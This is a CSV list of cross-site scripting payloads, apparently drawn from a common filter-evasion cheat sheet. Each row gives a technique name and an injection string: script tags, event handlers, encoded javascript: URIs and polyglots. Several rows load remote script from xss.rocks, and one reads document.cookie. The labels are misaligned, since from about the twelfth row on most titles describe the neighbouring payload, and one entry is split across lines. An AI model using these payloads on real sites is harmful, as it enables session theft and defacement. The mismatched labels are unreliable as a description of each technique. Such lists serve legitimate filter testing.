title,pattern
XSS Locator,";alert(String.fromCharCode(88,83,83))//';alert(String.fromCharCode(88,83,83))//"";alert(String.fromCharCode(88,83,83))//"";alert(String.fromCharCode(88,83,83))//--></SCRIPT>"">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>"
XSS Locator (short),"';!--""<XSS>=&{()}"
XSS basic, <script>alert('hyeji')</script>
No Filter Evasion,<SCRIPT SRC=http://xss.rocks/xss.js></SCRIPT>
Filter bypass based polyglot,""">><marquee><img src=x onerror=confirm(1)></marquee>""></plaintext\></|\><plaintext/onmouseover=prompt(1)>
<script>prompt(1)</script>@gmail.com<isindex formaction=javascript:alert(/XSS/) type=submit>'-->""></script><script>alert(document.cookie)</script>""><img/id=""confirm&lpar;1)""/alt=""/""src=""/""onerror=eval(id)>'""><img src=""http://www.shellypalmer.com/wp-content/images/2015/07/hacked-compressor.jpg"">"
Image XSS using the JavaScript directive ,"<IMG SRC=""javascript:alert('XSS');"">"
No quotes and no semicolon,<IMG SRC=javascript:alert('XSS')>
Case insensitive XSS attack vector,<IMG SRC=JaVaScRiPt:alert('XSS')>
HTML entities,"<IMG SRC=javascript:alert(""XSS"")>"
Grave accent obfuscation,"<IMG SRC=`javascript:alert(""RSnake says, 'XSS'"")`>"
Malformed A tags,"<IMG """"""><SCRIPT>alert(""XSS"")</SCRIPT>"">"
Malformed IMG tags,"<IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>"
fromCharCode,"<IMG SRC=# onmouseover=""alert('xxs')"">"
Default SRC tag to get past filters that check SRC domain,"<IMG SRC= onmouseover=""alert('xxs')"">"
Default SRC tag by leaving it empty,"<IMG onmouseover=""alert('xxs')"">"
Default SRC tag by leaving it out entirely,"<IMG SRC=/ onerror=""alert(String.fromCharCode(88,83,83))""></img>"
On error alert,"<img src=x onerror=""&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041"">"
IMG  onerror and javascript alert encode,"<IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;
&#39;&#88;&#83;&#83;&#39;&#41;>"
Decimal HTML character references,"<IMG SRC=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&
#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041>"
Decimal HTML character references without trailing semicolons,<IMG SRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29>
Hexadecimal HTML character references without trailing semicolons,"<IMG SRC=""jav	ascript:alert('XSS');"">"
Embedded tab,"<IMG SRC=""jav&#x09;ascript:alert('XSS');"">"
Embedded Encoded tab,"<IMG SRC=""jav&#x0A;ascript:alert('XSS');"">"
Embedded newline to break up XSS,"<IMG SRC=""jav&#x0D;ascript:alert('XSS');"">"
Embedded carriage return to break up XSS,"perl -e 'print ""<IMG SRC=java\0script:alert(\""XSS\"")>"";' > out"
Null breaks up JavaScript directive,"<IMG SRC="" &#14;  javascript:alert('XSS');"">"
Spaces and meta chars before the JavaScript in images for XSS,"<SCRIPT/XSS SRC=""http://xss.rocks/xss.js""></SCRIPT>"
Non-alpha-non-digit XSS,"<BODY onload!#$%&()*~+-_.,:;?@[/|\]^`=alert(""XSS"")>"
Extraneous open brackets,"<SCRIPT/SRC=""http://xss.rocks/xss.js""></SCRIPT>"
No closing script tags,"<<SCRIPT>alert(""XSS"");//<</SCRIPT>"
Protocol resolution in script tags,<SCRIPT SRC=http://xss.rocks/xss.js?< B >
Half open HTML/JavaScript XSS vector,<SCRIPT SRC=//xss.rocks/.j>
Double open angle brackets,"<IMG SRC=""javascript:alert('XSS')"""
Escaping JavaScript escapes,<iframe src=http://xss.rocks/scriptlet.html <
End title tag,"\"";alert('XSS');//"
INPUT image,</script><script>alert('XSS');</script>
BODY image,"</TITLE><SCRIPT>alert(""XSS"");</SCRIPT>"
IMG Dynsrc,"<INPUT TYPE=""IMAGE"" SRC=""javascript:alert('XSS');"">"
IMG lowsrc,"<BODY BACKGROUND=""javascript:alert('XSS')"">"
List-style-image,"<IMG DYNSRC=""javascript:alert('XSS')"">"
VBscript in an image,"<IMG LOWSRC=""javascript:alert('XSS')"">"
Livescript (older versions of Netscape only),"<STYLE>li {list-style-image: url(""javascript:alert('XSS')"");}</STYLE><UL><LI>XSS</br>"
SVG object tag,"<IMG SRC='vbscript:msgbox(""XSS"")'>"
BODY tag,"<IMG SRC=""livescript:[code]"">"
Event Handlers,<svg/onload=alert('XSS')>
BGSOUND,<BODY ONLOAD=alert('XSS')>
& JavaScript includes,"<BGSOUND SRC=""javascript:alert('XSS');"">"
STYLE sheet,"<BR SIZE=""&{alert('XSS')}"">"
Remote style sheet,"<LINK REL=""stylesheet"" HREF=""javascript:alert('XSS');"">"
Remote style sheet part 2,"<LINK REL=""stylesheet"" HREF=""http://xss.rocks/xss.css"">"
